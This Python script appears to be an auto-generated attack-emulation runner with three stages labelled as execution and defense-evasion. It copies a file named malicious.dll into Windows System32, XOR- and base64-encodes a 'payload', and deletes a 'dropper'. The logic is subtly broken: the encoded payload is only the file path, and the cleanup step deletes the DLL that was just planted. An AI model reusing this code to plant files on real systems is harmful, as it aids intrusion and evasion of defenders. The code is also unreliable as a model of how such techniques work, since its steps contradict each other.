#!/usr/bin/env python3
import sys
import json
import time
from typing import Dict, Any
import shutil
import os
import base64

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the malicious DLL name and the target directory
        dll_name = "malicious.dll"
        target_directory = os.path.join(os.environ['WINDIR'], 'System32')
        
        # Construct the full path for the DLL
        dll_path = os.path.join(target_directory, dll_name)
        
        # Simulate placing the DLL by copying it to the target directory
        # For the purpose of this task, assume the DLL is in the current directory
        shutil.copy(dll_name, dll_path)
        
        result = {
            "path": dll_path,
            "dll_name": dll_name
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data with None values on failure
        return {'success': False, 'data': {'path': None, 'dll_name': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt the data with the given key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract path and dll_name from input_data
        path = input_data.get('path', '')
        dll_name = input_data.get('dll_name', '')

        # Combine path and dll_name to form the payload
        payload = f"{path}\\{dll_name}".encode()

        # Define a simple XOR key
        xor_key = b'secretkey'

        # XOR encrypt the payload
        encrypted_payload = xor_encrypt(payload, xor_key)

        # Encode the XOR encrypted payload with base64
        encoded_data = base64.b64encode(encrypted_payload).decode()

        # Convert the encoded data to hex string for output
        result = {'encoded_data': encoded_data.encode().hex()}

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'encoded_data': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract the path and dll_name from input_data
        path = input_data.get('path', '')
        dll_name = input_data.get('dll_name', '')

        # Construct the full file path
        file_path = os.path.join(path, dll_name)

        # Attempt to delete the file
        if os.path.exists(file_path):
            os.remove(file_path)
            success = not os.path.exists(file_path)
        else:
            success = False

        result = {'success': success}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Place Malicious DLL [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Place Malicious DLL): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Place Malicious DLL): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Encode Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Encode Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Encode Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Delete Original Dropper [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Delete Original Dropper): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Delete Original Dropper): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))